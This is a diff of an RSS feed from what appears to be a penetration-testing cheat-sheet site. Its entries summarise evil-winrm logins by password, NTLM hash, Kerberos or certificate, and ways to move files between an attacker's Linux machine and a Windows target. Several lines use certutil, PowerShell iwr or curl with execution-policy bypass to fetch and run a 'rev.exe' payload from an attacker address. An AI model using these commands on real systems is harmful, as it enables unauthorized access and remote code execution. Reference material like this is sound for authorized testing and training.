@@ -12,21 +12,21 @@
       <link>https://tldrbins.github.io/evil-winrm/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/evil-winrm/</guid>
-      <description> Connect by password evil-winrm -i &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; Connect by hash evil-winrm -i &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -H &amp;lt;HASH&amp;gt; Connect by kerberos sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; evil-winrm -i &amp;lt;TARGET&amp;gt; -r &amp;lt;DOMAIN&amp;gt; Connect by .crt and .key evil-winrm -i &amp;lt;TARGET&amp;gt; -S -k auth.key -c auth.crt </description>
+      <description>Connection Methods Password Hash Kerberos crt &amp;amp; key evil-winrm -i &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; evil-winrm -i &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -H &amp;lt;HASH&amp;gt; # Step 1: Edit &amp;#39;/etc/krb5.conf&amp;#39; [libdefaults] default_realm = &amp;lt;DOMAIN&amp;gt; [realms] &amp;lt;DOMAIN&amp;gt; = { kdc = &amp;lt;DC&amp;gt;:88 admin_server = &amp;lt;DC&amp;gt; default_domain = &amp;lt;DOMAIN&amp;gt; } [domain_realm] .domain.internal = &amp;lt;DOMAIN&amp;gt; domain.internal = &amp;lt;DOMAIN&amp;gt; # Step 2: export .ccache export KRB5CCNAME=&amp;lt;CCACHE&amp;gt; # Step 3: Connect sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; evil-winrm -i &amp;lt;TARGET&amp;gt; -r &amp;lt;DC&amp;gt; evil-winrm -i &amp;lt;TARGET&amp;gt; -S -k auth.</description>
     </item>
     <item>
       <title>File Transfer (Linux to Windows)</title>
       <link>https://tldrbins.github.io/file_transfer_linux_to_windows/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/file_transfer_linux_to_windows/</guid>
-      <description>HTTP Start a Local HTTP Server python3 -m http.server 80 cmd certutil -urlcache -split -f http://10.10.14.10/rev.exe C:\ProgramData\rev.exe # Upload and Run certutil -urlcache -split -f http://10.10.14.10/rev.exe C:\ProgramData\rev.exe &amp;amp;&amp;amp; C:\ProgramData\rev.exe powershell # Long version Invoke-WebRequest http://10.10.14.10/rev.exe -OutFile C:\ProgramData\rev.exe # Short version iwr http://10.10.14.10/rev.exe -o C:\ProgramData\rev.exe Note: PowerShell 3.0+&#xA;# Long version powershell.exe -ExecutionPolicy bypass curl 10.10.14.10/rev.exe -o C:\ProgramData\rev.exe # Short version powershell -ep bypass curl 10.10.14.10/rev.exe -o C:\ProgramData\rev.exe Note: curl is not always available</description>
+      <description>CMD Powershell evil-winrm Start a Local HTTP Server python3 -m http.server 80 certutil -urlcache -split -f http://10.10.14.10/rev.exe C:\ProgramData\rev.exe # Upload and Run certutil -urlcache -split -f http://10.10.14.10/rev.exe C:\ProgramData\rev.exe &amp;amp;&amp;amp; C:\ProgramData\rev.exe Start a Local HTTP Server python3 -m http.server 80 # Long version Invoke-WebRequest http://10.10.14.10/rev.exe -OutFile C:\ProgramData\rev.exe # Short version iwr http://10.10.14.10/rev.exe -o C:\ProgramData\rev.exe Note: PowerShell 3.0+&#xA;# Long version powershell.exe -ExecutionPolicy bypass curl 10.10.14.10/rev.exe -o C:\ProgramData\rev.exe # Short version powershell -ep bypass curl 10.</description>
     </item>
     <item>
       <title>File Transfer (Windows To Linux)</title>
       <link>https://tldrbins.github.io/file_transfer_windows_to_linux/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/file_transfer_windows_to_linux/</guid>
-      <description>SMB Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\10.10.14.10\share # Connect to SMB server with creds net use \\10.10.14.10\share /u:&amp;lt;USER&amp;gt; &amp;lt;PASSWORD&amp;gt; # From target Windows to local Linux copy example.txt \\10.10.14.10\share # From local Linux to target Windows copy \\10.10.14.10\share\example.txt example.txt # Delete file del example.txt # Remove SMB share net use /d \\10.10.14.10\share # Older Windows (e.</description>
+      <description>SMB Base64 evil-winrm Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\10.10.14.10\share # Connect to SMB server with creds net use \\10.10.14.10\share /u:&amp;lt;USER&amp;gt; &amp;lt;PASSWORD&amp;gt; # From target Windows to local Linux copy example.txt \\10.10.14.10\share # From local Linux to target Windows copy \\10.10.14.10\share\example.txt example.txt # Delete file del example.txt # Remove SMB share net use /d \\10.10.14.10\share # Older Windows (e.</description>
     </item>
   </channel>
 </rss>
